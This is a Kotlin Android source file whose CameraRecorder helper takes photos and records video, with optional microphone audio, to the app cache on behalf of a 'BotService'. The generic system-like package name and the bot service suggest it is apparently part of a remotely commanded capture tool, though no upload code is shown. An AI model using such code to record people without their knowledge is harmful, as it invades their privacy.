package com.sys.svc.helpers

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.ServiceInfo
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CameraMetadata
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.params.StreamConfigurationMap
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.Size
import android.view.Surface
import com.sys.svc.BotService
import com.sys.svc.Logger
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference

object CameraRecorder {
    private var bgThread: HandlerThread? = null
    private var bgHandler: Handler? = null
    private var device: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var mediaRecorder: MediaRecorder? = null
    private var videoFile: File? = null
    private var videoSurface: Surface? = null

    private fun ensureBg() {
        if (bgThread?.isAlive != true) {
            bgThread = HandlerThread("cam").also { it.start() }
            bgHandler = Handler(bgThread!!.looper)
        }
    }

    @SuppressLint("MissingPermission")
    fun capturePhoto(ctx: Context, cameraId: String = "0", timeoutSec: Int = 8): File? {
        ensureBg()
        BotService.get()?.addForegroundTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        val latch = CountDownLatch(1)
        val result = AtomicReference<File?>(null)

        try {
            val mgr = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val chars = mgr.getCameraCharacteristics(cameraId)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                as StreamConfigurationMap
            val size = map.getOutputSizes(ImageFormat.JPEG)
                ?.maxByOrNull { it.width.toLong() * it.height } ?: Size(1920, 1080)
            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
            imageReader = reader
            val f = File(ctx.cacheDir, "photo_${System.currentTimeMillis()}.jpg")

            reader.setOnImageAvailableListener({ r ->
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val buf = img.planes[0].buffer
                    val bytes = ByteArray(buf.remaining())
                    buf.get(bytes)
                    FileOutputStream(f).use { it.write(bytes) }
                    result.set(f)
                } catch (e: Exception) {
                    Logger.e("Cam", "write", e)
                } finally {
                    img.close()
                    latch.countDown()
                }
            }, bgHandler)

            mgr.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    device = cam
                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        .apply {
                            addTarget(reader.surface)
                            set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                        }
                    cam.createCaptureSession(
                        listOf(reader.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                session = s
                                try { s.capture(req.build(), null, bgHandler) }
                                catch (e: Exception) { latch.countDown() }
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) {
                                latch.countDown()
                            }
                        },
                        bgHandler
                    )
                }
                override fun onDisconnected(cam: CameraDevice) {
                    cam.close(); latch.countDown()
                }
                override fun onError(cam: CameraDevice, e: Int) {
                    cam.close(); latch.countDown()
                }
            }, bgHandler)

            latch.await(timeoutSec.toLong(), TimeUnit.SECONDS)
        } catch (e: Exception) {
            Logger.e("Cam", "photo", e)
        }
        cleanup()
        BotService.get()?.resetForegroundTypes()
        return result.get()
    }

    @SuppressLint("MissingPermission")
    fun startVideo(
        ctx: Context,
        cameraId: String = "0",
        withAudio: Boolean = false,
        width: Int = 1280,
        height: Int = 720,
        fps: Int = 30
    ): File? {
        if (mediaRecorder != null) return null
        ensureBg()
        var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        if (withAudio) types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        BotService.get()?.addForegroundTypes(types)

        return try {
            val mgr = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val f = File(ctx.cacheDir, "vid_${System.currentTimeMillis()}.mp4")
            val rec = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx)
                      else @Suppress("DEPRECATION") MediaRecorder()
            rec.setVideoSource(MediaRecorder.VideoSource.SURFACE)
            if (withAudio) rec.setAudioSource(MediaRecorder.AudioSource.MIC)
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            rec.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            rec.setVideoSize(width, height)
            rec.setVideoFrameRate(fps)
            rec.setVideoEncodingBitRate(width * height * fps / 4)
            if (withAudio) {
                rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                rec.setAudioEncodingBitRate(128_000)
                rec.setAudioSamplingRate(44100)
            }
            rec.setOutputFile(f.absolutePath)
            rec.prepare()
            mediaRecorder = rec
            videoFile = f
            videoSurface = rec.surface

            mgr.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    device = cam
                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                        .apply { addTarget(videoSurface!!) }
                    cam.createCaptureSession(
                        listOf(videoSurface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                session = s
                                try {
                                    s.setRepeatingRequest(req.build(), null, bgHandler)
                                    rec.start()
                                    Logger.i("Cam", "recording started")
                                } catch (e: Exception) {
                                    Logger.e("Cam", "start rec", e)
                                }
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) {
                                Logger.e("Cam", "configure failed", null)
                            }
                        },
                        bgHandler
                    )
                }
                override fun onDisconnected(cam: CameraDevice) { cam.close() }
                override fun onError(cam: CameraDevice, e: Int) { cam.close() }
            }, bgHandler)
            f
        } catch (e: Exception) {
            Logger.e("Cam", "startVideo", e)
            BotService.get()?.resetForegroundTypes()
            null
        }
    }

    fun stopVideo(): File? {
        if (mediaRecorder == null) return null
        val f = videoFile
        try { mediaRecorder?.stop() } catch (e: Exception) { Logger.w("Cam", "stop: ${e.message}") }
        try { mediaRecorder?.release() } catch (_: Exception) {}
        mediaRecorder = null
        videoSurface = null
        videoFile = null
        cleanup()
        BotService.get()?.resetForegroundTypes()
        return f
    }

    fun isRecording(): Boolean = mediaRecorder != null

    private fun cleanup() {
        try { session?.close() } catch (_: Exception) {}
        try { device?.close() } catch (_: Exception) {}
        try { imageReader?.close() } catch (_: Exception) {}
        session = null
        device = null
        imageReader = null
    }
}